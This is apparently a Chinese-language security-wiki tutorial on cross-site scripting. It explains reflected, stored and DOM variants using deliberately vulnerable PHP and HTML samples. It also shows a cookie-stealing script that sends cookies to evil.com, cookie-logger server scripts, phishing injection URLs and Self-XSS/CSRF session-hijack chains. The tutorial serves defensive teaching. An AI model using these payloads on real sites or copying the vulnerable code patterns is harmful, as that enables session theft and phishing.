# XSS

## XSS 簡介

跨站腳本（Cross-Site Scripting，XSS）是一種經常出現在 WEB 應用程序中的計算機安全漏洞，是由於 WEB 應用程序對用戶的輸入過濾不足而產生的。攻擊者利用網站漏洞把惡意的腳本代碼注入到網頁中，當其他用戶瀏覽這些網頁時，就會執行其中的惡意代碼，對受害用戶可能採取 Cookies 資料竊取、會話劫持、釣魚欺騙等各種攻擊。

### 反射型 XSS

反射型跨站腳本（Reflected Cross-Site Scripting）是最常見，也是使用最廣的一種，可將惡意腳本附加到 URL 地址的參數中。

反射型 XSS 的利用一般是攻擊者通過特定手法（如電子郵件），誘使用戶去訪問一個包含惡意代碼的 URL，當受害者點擊這些專門設計的鏈接的時候，惡意代碼會直接在受害者主機上的瀏覽器執行。此類 XSS 通常出現在網站的搜索欄、用戶登錄口等地方，常用來竊取客戶端 Cookies 或進行釣魚欺騙。

服務器端代碼：

```php
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Feedback for end user 
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
} 
?>
```

可以看到，代碼直接引用了 `name` 參數，並沒有做任何的過濾和檢查，存在明顯的 XSS 漏洞。

### 持久型 XSS

持久型跨站腳本（Persistent Cross-Site Scripting）也等同於存儲型跨站腳本（Stored Cross-Site Scripting）。

此類 XSS 不需要用戶單擊特定 URL 就能執行跨站腳本，攻擊者事先將惡意代碼上傳或儲存到漏洞服務器中，只要受害者瀏覽包含此惡意代碼的頁面就會執行惡意代碼。持久型 XSS 一般出現在網站留言、評論、博客日誌等交互處，惡意腳本存儲到客戶端或者服務端的數據庫中。

服務器端代碼：

```php
<?php
  if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysql_real_escape_string( $message );
    // Sanitize name input
    $name = mysql_real_escape_string( $name );
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
    //mysql_close(); }
?>
```

代碼只對一些空白符、特殊符號、反斜槓進行了刪除或轉義，沒有做 XSS 的過濾和檢查，且存儲在數據庫中，明顯存在存儲型 XSS 漏洞。

### DOM XSS

傳統的 XSS 漏洞一般出現在服務器端代碼中，而 DOM-Based XSS 是基於 DOM 文檔對象模型的一種漏洞，所以，受客戶端瀏覽器的腳本代碼所影響。客戶端 JavaScript 可以訪問瀏覽器的 DOM 文本對象模型，因此能夠決定用於加載當前頁面的 URL。換句話說，客戶端的腳本程序可以通過 DOM 動態地檢查和修改頁面內容，它不依賴於服務器端的數據，而從客戶端獲得 DOM 中的數據（如從 URL 中提取數據）並在本地執行。另一方面，瀏覽器用戶可以操縱 DOM 中的一些對象，例如 URL、location 等。用戶在客戶端輸入的數據如果包含了惡意 JavaScript 腳本，而這些腳本沒有經過適當的過濾和消毒，那麼應用程序就可能受到基於 DOM 的 XSS 攻擊。

HTML 代碼：

```html
<html>
  <head>
    <title>DOM-XSS test</title>
  </head>
  <body>
    <script>
      var a=document.URL;
      document.write(a.substring(a.indexOf("a=")+2,a.length));
    </script>
  </body>
</html>
```

將代碼保存在 domXSS.html 中，瀏覽器訪問：

```
http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script>
```

即可觸發 XSS 漏洞。

## XSS 利用方式

### Cookies 竊取

攻擊者可以使用以下代碼獲取客戶端的 Cookies 信息：

```html
<script>
document.location="http://www.evil.com/cookie.asp?cookie="+document.cookie
new Image().src="http://www.evil.com/cookie.asp?cookie="+document.cookie
</script>
<img src="http://www.evil.com/cookie.asp?cookie="+document.cookie></img>
```

在遠程服務器上，有一個接受和記錄 Cookies 信息的文件，示例如下：

```asp
<%
  msg=Request.ServerVariables("QUERY_STRING")
  testfile=Server.MapPath("cookie.txt")
  set fs=server.CreateObject("Scripting.filesystemobject")
  set thisfile=fs.OpenTextFile(testfile,8,True,0)
  thisfile.Writeline(""&msg& "")
  thisfile.close
  set fs=nothing
%>
```

```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>
```

攻擊者在獲取到 Cookies 之後，通過修改本機瀏覽器的 Cookies，即可登錄受害者的賬戶。

### 會話劫持

由於使用 Cookies 存在一定的安全缺陷，因此，開發者開始使用一些更爲安全的認證方式，如 Session。在 Session 機制中，客戶端和服務端通過標識符來識別用戶身份和維持會話，但這個標識符也有被其他人利用的可能。會話劫持的本質是在攻擊中帶上了 Cookies 併發送到了服務端。

如某 CMS 的留言系統存在一個存儲型 XSS 漏洞，攻擊者把 XSS 代碼寫進留言信息中，當管理員登錄後臺並查看是，便會觸發 XSS 漏洞，由於 XSS 是在後臺觸發的，所以攻擊的對象是管理員，通過注入 JavaScript 代碼，攻擊者便可以劫持管理員會話執行某些操作，從而達到提升權限的目的。

比如，攻擊者想利用 XSS 添加一個管理員賬號，只需要通過之前的代碼審計或其他方式，截取到添加管理員賬號時的 HTTP 請求信息，然後使用 XMLHTTP 對象在後臺發送一個 HTTP 請求即可，由於請求帶上了被攻擊者的 Cookies，並一同發送到服務端，即可實現添加一個管理員賬戶的操作。

### 釣魚

-   重定向釣魚

    把當前頁面重定向到一個釣魚頁面。

    ```
    http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
    ```

-   HTML 注入式釣魚

    使用 XSS 漏洞注入 HTML 或 JavaScript 代碼到頁面中。

    ```
    http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center;"><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password:<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/></form></div></body></html>
    ```

該段代碼會在正常頁面中嵌入一個 Form 表單。

-   iframe 釣魚

    這種方式是通過 `<iframe>` 標籤嵌入遠程域的一個頁面實施釣魚。

    ```
    http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"</iframe>
    ```

-   Flash 釣魚

    將構造好的 Flash 文件傳入服務器，在目標網站用 `<object>` 或 `<embed>` 標籤引用即可。

-   高級釣魚技術

    注入代碼劫持 HTML 表單、使用 JavaScript 編寫鍵盤記錄器等。

### 網頁掛馬

一般都是通過篡改網頁的方式來實現的，如在 XSS 中使用 `<iframe>` 標籤。

### DOS 與 DDOS

注入惡意 JavaScript 代碼，可能會引起一些拒絕服務攻擊。

### XSS 蠕蟲

通過精心構造的 XSS 代碼，可以實現非法轉賬、篡改信息、刪除文章、自我複製等諸多功能。

## Self-XSS 變廢爲寶的場景

Self-XSS 顧名思義，就是一個具有 XSS 漏洞的點只能由攻擊者本身觸發，即自己打自己的攻擊。比如個人隱私的輸入點存在 XSS。但是由於這個隱私信息只能由用戶本人查看也就無法用於攻擊其他人。這類漏洞通常危害很小，顯得有些雞肋。但是在一些具體的場景下，結合其他漏洞（比如 CSRF ）就能將 Self-XSS 轉變爲具有危害的漏洞。下面將總結一些常見可利用 Self-XSS 的場景。

- 登錄登出存在 CSRF，個人信息存在 Self-XSS，第三方登錄

  這種場景一般的利用流程是首先攻擊者在個人信息 XSS 點注入 Payload，然後攻擊者製造一個惡意頁面誘導受害者訪問，惡意頁面執行以下操作：

  1. 惡意頁面執行利用 CSRF 讓受害者登錄攻擊者的個人信息位置，觸發 XSS payload
  2. JavaScript Payload 生成 `<iframe>` 標籤，並在框架內執行以下這些操作
  3. 讓受害者登出攻擊者的賬號
  4. 然後使得受害者通過 CSRF 登錄到自己的賬戶個人信息界面
  5. 攻擊者從頁面提取 CSRF Token
  6. 然後可以使用 CSRF Token 提交修改用戶的個人信息

  這種攻擊流程需要注意幾個地方：第三步登錄是不需要用戶交互的，利用 Google Sign In 等非密碼登錄方式登錄；**X-Frame-Options**  需要被設置爲同源（該頁面可以在相同域名頁面的 `iframe` 中展示 ）

- 登錄存在 CSRF，賬戶信息存在 Self-XSS，OAUTH 認證

  1. 讓用戶退出賬戶頁面，但是不退出 OAUTH 的授權頁面，這是爲了保證用戶能重新登錄其賬戶頁面
  2. 讓用戶登錄我們的賬戶頁面出現 XSS，利用 使用 `<iframe>` 標籤等執行惡意代碼
  3. 登錄回他們各自的賬戶，但是我們的 XSS 已經竊取到 Session
